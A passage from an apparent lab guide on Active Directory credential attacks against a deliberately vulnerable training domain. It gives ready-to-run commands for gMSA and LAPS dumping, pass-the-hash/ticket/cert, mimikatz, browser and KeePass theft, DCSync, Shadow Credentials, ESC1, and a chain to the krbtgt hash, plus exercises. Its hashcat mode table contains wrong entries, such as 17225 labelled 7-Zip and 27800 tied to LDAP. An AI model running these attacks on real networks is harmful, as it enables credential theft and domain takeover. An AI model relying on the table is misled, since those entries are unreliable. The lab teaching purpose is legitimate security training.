nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M gmsa
```

If your account is in the readers list:

```bash
gMSADumper.py -u peter.parker -p 'DVADlab2024!' -d corp.local -l 10.10.0.10
```

Output:

```
svc_gmsa$:::aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c
svc_gmsa$ KRB AES256: a1b2c3...
```

Use immediately:

```bash
impacket-getTGT -hashes :8846f7... 'corp.local/svc_gmsa$'
impacket-psexec -k -no-pass 'corp.local/svc_gmsa$@target'
```

[Flag: CRED-024 — gMSA read]

### Mitigation

- Audit `msDS-GroupMSAMembership` regularly. Only the service host(s) need read.
- Move gMSA into a non-Tier-0 OU where compromise has lower blast radius.

---

## 10.12 LAPS password read — CRED-041

### Legacy LAPS

```bash
nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' --dump-laps
# Or via ldapsearch
$LDAP "(ms-Mcs-AdmPwd=*)" sAMAccountName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime
```

### Windows LAPS (2023+)

Attribute changed to `msLAPS-Password` (cleartext when no encryption configured) and `msLAPS-EncryptedPassword` (DPAPI-NG encrypted when enabled).

```bash
nxc ldap 10.10.0.10 -u peter.parker -p 'DVADlab2024!' -M laps
```

NetExec's `laps` module handles legacy + Windows LAPS encryption decoding automatically.

[Flag: CRED-041 — LAPS read]

---

## 10.13 Pass-the-hash, pass-the-key, pass-the-ticket, pass-the-cert

Once you have credentials in **any** form, the same principle holds: forge or replay.

### PTH (NT hash)

```bash
impacket-psexec -hashes :<NT> 'corp.local/Administrator@dc01.corp.local'
impacket-wmiexec -hashes :<NT> 'corp.local/Administrator@dc01.corp.local'
impacket-smbclient -hashes :<NT> 'corp.local/Administrator@dc01.corp.local'
evil-winrm -i 10.10.0.10 -u Administrator -H <NT>
nxc smb 10.10.0.0/21 -u Administrator -H <NT> --local-auth
```

### PTK (AES256 key)

```bash
# Get TGT from AES key
impacket-getTGT -aesKey <AES256> 'corp.local/Administrator'

# Use the TGT
export KRB5CCNAME=Administrator.ccache
impacket-psexec -k -no-pass 'corp.local/Administrator@dc01.corp.local'
```

### PTT (Kerberos ticket)

```bash
# Inject a kirbi or ccache
export KRB5CCNAME=peter.parker.ccache

# Convert kirbi → ccache (Rubeus → impacket)
impacket-ticketConverter peter.parker.kirbi peter.parker.ccache

# Or the other way
impacket-ticketConverter peter.parker.ccache peter.parker.kirbi
```

On Windows (Rubeus):

```
PS> Rubeus.exe ptt /ticket:peter.parker.kirbi
PS> klist
PS> dir \\dc01.corp.local\C$
```

### PTC (pass-the-cert)

```bash
# Use cert directly with certipy (PKINIT)
certipy auth -pfx peter.parker.pfx -dc-ip 10.10.0.10

# Or generate a TGT and PTT
KRB5CCNAME=peter.parker.ccache impacket-psexec -k -no-pass 'corp.local/peter.parker@target'
```

### Overpass-the-hash (the hybrid)

You have an NT hash but want a Kerberos TGT (so you can use kerberos-only services, or move where NTLM is disabled):

```bash
impacket-getTGT -hashes :<NT> 'corp.local/Administrator'
```

This calls AS-REQ with `PA-ENC-TIMESTAMP` derived from the NT hash (RC4 etype). Works because RC4 Kerberos key derivation = NT hash directly. If RC4 is disabled on the account, you need the AES key instead (PTK).

[Flag: CRED-012 — PTH; CRED-013 — PTK; CRED-014 — PTT; CRED-015 — PTC; CRED-016 — Overpass-the-hash]

---

## 10.14 Vault, RDP cred file, browser, KeePass

Beyond DPAPI master key extraction, several artifacts deserve direct attention:

### Windows Credential Manager

```bash
# Live (mimikatz)
mimikatz# vault::cred
mimikatz# vault::list
```

Returns each saved credential with type (Domain, Generic, etc.). DPAPI-decrypted live.

### Saved RDP files

```cmd
dir /s C:\Users\*\Documents\*.rdp
```

`.rdp` files often contain a `password 51:b:<hex>` entry — DPAPI-encrypted under that user's master key.

### Browser

Chrome/Edge:

```
C:\Users\<u>\AppData\Local\Google\Chrome\User Data\Default\Login Data           (SQLite)
C:\Users\<u>\AppData\Local\Google\Chrome\User Data\Local State                 (master key wrapped)
```

DPAPI decrypts Local State → AES key → decrypt Login Data entries.

```bash
# Lazagne (or impacket dpapi)
python3 laZagne.py all
```

### KeePass `.kdbx`

```bash
keepass2john pass.kdbx > kdbx.hash
hashcat -m 13400 kdbx.hash /usr/share/wordlists/rockyou.txt
```

Hashcat mode 13400 is KeePass.

[Flag: CRED-046..049 — vault, RDP, browser, KeePass]

---

## 10.15 Cached credentials (DCC2 / mscash2)

Domain Cached Credentials — used to log in when the DC is unreachable. Stored under HKLM\SECURITY\Cache:

```bash
impacket-secretsdump -system system.save -security security.save LOCAL
```

Output includes:

```
$DCC2$10240#peter.parker#abcdef1234567890abcdef1234567890
```

Hashcat mode 2100:

```bash
hashcat -m 2100 dcc2.hash /usr/share/wordlists/rockyou.txt
```

Slower than NT (PBKDF2-HMAC-SHA1 with 10,240 iterations); use rules, not pure brute force.

[Flag: CRED-043 — DCC2 crack]

---

## 10.16 Kerberos delegation abuse — re-cap from chapter 05

DVAD ships three delegation flavours:

### Unconstrained — CRED-017

User/Computer with `TRUSTED_FOR_DELEGATION` (UAC bit `0x80000`). When a target authenticates to it, it receives a **forwarded TGT** in the AP-REQ. You read it via LSASS, then impersonate.

```bash
# Find unconstrained delegators
ldapsearch ... '(userAccountControl:1.2.840.113556.1.4.803:=524288)'

# After compromise, coerce a high-priv user to authenticate to the unconstrained host
# (or a DC via SpoolSample), then dump the cached TGT
mimikatz# sekurlsa::tickets /export
```

### Constrained — CRED-018

`msDS-AllowedToDelegateTo` populated → S4U2Self + S4U2Proxy for the listed SPNs only.

```bash
impacket-getST -spn 'cifs/file01.corp.local' -impersonate Administrator \
    -dc-ip 10.10.0.10 'corp.local/svc_constrained:Password1!'
```

### RBCD — CRED-019

Already covered in §10.7.

[Flags: CRED-017 unconstrained, CRED-018 constrained, CRED-019 RBCD]

---

## 10.17 Cracking strategy — choosing the wordlist

The same hashcat mode behaves very differently with the right wordlist. Strategy:

1. **rockyou.txt** + best64 rules — 90% of weak human passwords.
2. **rockyou.txt** + OneRuleToRuleThemAll — bigger ruleset, slower.
3. **Crackstation** wordlist (15GB) — covers most leaked combos.
4. **Targeted spray** — `<companyname><year>!` patterns. Often catches password resets.
5. **Mask attack** — `?u?l?l?l?l?d?d?s` etc. when you suspect a pattern.
6. **Hybrid** — wordlist + 4-digit suffix:

```bash
hashcat -a 6 -m 13100 hash.txt rockyou.txt ?d?d?d?d
```

7. **PRINCE / combinator** — combine two wordlists.

For Kerberoast specifically, the *password complexity policy* tells you the minimum length. If MinPwdLength=12, drop short rockyou entries:

```bash
awk 'length($0) >= 12' rockyou.txt > rockyou-12plus.txt
```

---

## 10.18 PFX/PKCS#12 password cracking

A `.pfx` whose private key is password-protected:

```bash
pfx2john peter.parker.pfx > pfx.hash
hashcat -m 9700 pfx.hash /usr/share/wordlists/rockyou.txt
# Mode 9700 = Office 2007 — pfx may need 9710 or 9810; see hashcat doc
```

Hashcat modes:

| Mode | Target |
|------|--------|
| 9700 | MS Office 2007 |
| 9710 | MS Office 2007 (collider mode) |
| 9810 | MS Office 2010 |
| 23700 | RAR3-p (only-archive-itself) |
| 17225 | 7-Zip |
| 1000 | NT |
| 5500 | NetNTLMv1 |
| 5600 | NetNTLMv2 |
| 13100 | Kerberos 5 TGS-REP etype 23 |
| 19700 | Kerberos 5 TGS-REP etype 18 |
| 18200 | Kerberos 5 AS-REP etype 23 |
| 18201 | Kerberos 5 AS-REP etype 17 |
| 2100 | DCC2 |
| 13400 | KeePass |
| 22200 | macOS Keychain |
| 27800 | MurmurHash3 (LDAP unicodePwd legacy) |

---

## 10.19 Combined attack chain — zero to krbtgt

```
Step | Action                                              | What changes
-----+-----------------------------------------------------+--------------
  1  | Responder LLMNR poison → tony.stark NetNTLMv2              | tony.stark's plaintext (after crack)
  2  | Kerberoast svc_jarvis → hashcat 13100                  | svc_jarvis plaintext
  3  | impacket-mssqlclient ... -windows-auth + xp_cmdshell| SYSTEM on sql01
  4  | comsvcs MiniDump lsass → pypykatz                   | NT hashes for everyone on sql01
  5  |   - svc_backup (Backup Operators) NT hash captured  | path to DC
  6  | evil-winrm with svc_backup NT → file01              | local admin on file01? or DC?
  7  | If DC: reg save SAM SYSTEM, robocopy /b NTDS.dit    | local-disk NTDS
  8  | impacket-secretsdump LOCAL → krbtgt hash            | krbtgt
  9  | Golden TGT (chapter 12)                             | forge any TGT, any user
```

Every step replaces one credential form with another. Recon then exploit then replace.

---

## Lab exercises

### Exercise 10.A — Roast everything

```bash
impacket-GetNPUsers corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
    -request -outputfile ~/dvad/loot/02-cred/asreproast/all.hash
impacket-GetUserSPNs corp.local/peter.parker:'DVADlab2024!' -dc-ip 10.10.0.10 \
    -request -outputfile ~/dvad/loot/02-cred/kerberoast/all.hash

hashcat -m 18200 ~/dvad/loot/02-cred/asreproast/all.hash rockyou.txt -r best64.rule
hashcat -m 13100 ~/dvad/loot/02-cred/kerberoast/all.hash rockyou.txt -r best64.rule
```

Record cracked plaintexts and what privileges each grants.

### Exercise 10.B — DCSync

```bash
impacket-secretsdump corp.local/doctor.strange:'DVADlab2024!'@10.10.0.10 \
    -just-dc-user krbtgt -outputfile ~/dvad/loot/02-cred/dcsync/krbtgt
```

Save the krbtgt NT hash, AES128, AES256 separately. You'll need them in chapter 12.

### Exercise 10.C — Shadow Credentials

```bash
certipy shadow auto -u peter.parker@corp.local -p 'DVADlab2024!' \
    -dc-ip 10.10.0.10 -account 'sql01$'
impacket-psexec -hashes :<sql01$_NT> 'corp.local/sql01$@sql01.corp.local'
```

Now try a manual flow with `certipy shadow add` / `certipy shadow list` / `certipy shadow remove`. Verify the planted KeyCredential is gone afterward.

### Exercise 10.D — RBCD chain

Follow §10.7 step-by-step. Confirm:

- `EVIL$` exists in AD.
- `msDS-AllowedToActOnBehalfOfOtherIdentity` on FILE01$ lists EVIL$.
- `dir \\file01\C$` succeeds with the impersonated Administrator ticket.

Then *roll it back* — remove the RBCD and the EVIL$ computer.

### Exercise 10.E — LSASS dump comparison

On file01, dump LSASS three ways:

1. `comsvcs MiniDump`
2. `procdump -ma lsass.exe`
3. `lsassy -M procdump`

Compare what `pypykatz` extracts from each. Note the size and any AV/Defender complaints.

### Exercise 10.F — DPAPI walkthrough

1. As an admin, extract the domain backup key from corp.local.
2. Pull tony.stark's master key file off ws01.
3. Decrypt master key with backup pvk.
4. Decrypt tony.stark's saved Chrome login DB.

### Exercise 10.G — gMSA dump

Find a gMSA in corp.local (use ENUM-045 from chapter 08). Identify the readers group. Add `peter.parker` to the readers group (only possible if you have GenericWrite on that group). Dump the gMSA password with `gMSADumper.py`.

### Exercise 10.H — ESC1 → DA

```bash
certipy find -u peter.parker -p ... -dc-ip 10.10.0.10 -vulnerable
# pick a template tagged ESC1
certipy req -u peter.parker -p ... -ca CORP-CA -template Vuln -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip 10.10.0.10
impacket-secretsdump -hashes :<adm_nt> corp.local/Administrator@dc01.corp.local -just-dc
```

### Exercise 10.I — Coerce + relay variants

For each relay target (LDAPS, ADCS HTTP, SMB), build the listener, run the coercion, capture the cred form (RBCD entry, cert, SMB session). Document signing/EPA preconditions for each.

### Exercise 10.J — Crack tour

Take five hashes (NT, NetNTLMv2, Kerb-TGS-RC4, Kerb-AS-REP, KeePass). Crack each with appropriate wordlist+rules. Record:

- Hashes per second.
- Time to crack.
- The mode used.
- Whether rockyou alone was enough or you needed rules.

---

## Self-check questions

1. What's the difference between Kerberoast and AS-REP roast at the protocol level?
2. Why does DCSync require **two** ACEs (`Get-Changes` + `Get-Changes-All`) and not just one?
3. What's in a DPAPI master key file, and how would you decrypt it without the user's password?
4. Why does NTLM relay to LDAPS usually require channel-binding to be off, even when SMB signing is enforced elsewhere?
5. What's the minimal precondition for the RBCD chain (excluding GenericWrite on the target)?
6. What changes between CRED-001 RC4 mode and AES mode for the cracker — both attack-mechanic and feasibility?
7. What's the difference between a gMSA password and a regular service-account password from an attacker's POV — particularly w.r.t. the AS-REQ key derivation?
8. Why is `procdump -ma lsass.exe` quieter than `comsvcs MiniDump` in many environments?
9. The Shadow Credentials attack writes a public key — why doesn't this leave a recoverable artifact when certipy "cleans up"?
10. Why does Pass-the-Hash work for NT hashes (NTLM) but not for AES Kerberos keys (PTK is a different operation)?
11. ZeroLogon dumps everything via DRSR. What ACE does the DC machine account hold that lets it do so?
12. If WDigest is enabled, why does the plaintext only appear in LSASS *after the next interactive logon* — not for users currently logged in before you flipped the registry?
13. What's the difference between PTC (pass-the-cert) and PKINIT?
14. When you crack a NetNTLMv2 (mode 5600), you get the plaintext. When you crack a Kerberos AS-REP (mode 18200), you also get plaintext. Why don't you get the NT hash in the latter?
15. The `-just-dc-user krbtgt` flag is much quieter than a full secretsdump. Why?
16. Why can't you DCSync against an RODC even with the same ACEs (or can you, with caveats)?
17. What event(s) on the DC would alert a defender to a `--delegate-access` ntlmrelayx attack against LDAPS?
18. The Certifried bug fixes a flaw in cert-to-account binding. What field did Microsoft add to the cert to fix it?
19. RBCD requires writing `msDS-AllowedToActOnBehalfOfOtherIdentity`. What does the value look like (DACL-encoded blob, friendly list, …)?
20. After Golden Ticket forging (covered in chapter 12), what one event remains a high-fidelity detection signal?

---

## References

- **harmj0y — *Kerberoasting Revisited*** — the canonical write-up.
- **TheHackerRecipes — Credentials category** — practical reference, well-indexed.
- **Sean Metcalf — *Active Directory Kerberos Attacks*** — DEF CON 24 talk.
- **Tim Medin — *Attacking Microsoft Kerberos*** — the original Kerberoasting paper.
- **SpecterOps — *Shadow Credentials*** — Elad Shamir's blog post.
- **Microsoft — *DPAPI*** — `dpapi.dll` SDK docs.
- **dirkjanm — *Pass-the-Hash and the road to mimikatz*** — protocol history.
- **Pixis — *Coerced Authentication and Relay Chains*** — practical.

Next: [11-lateral-and-privesc.md](11-lateral-and-privesc.md).
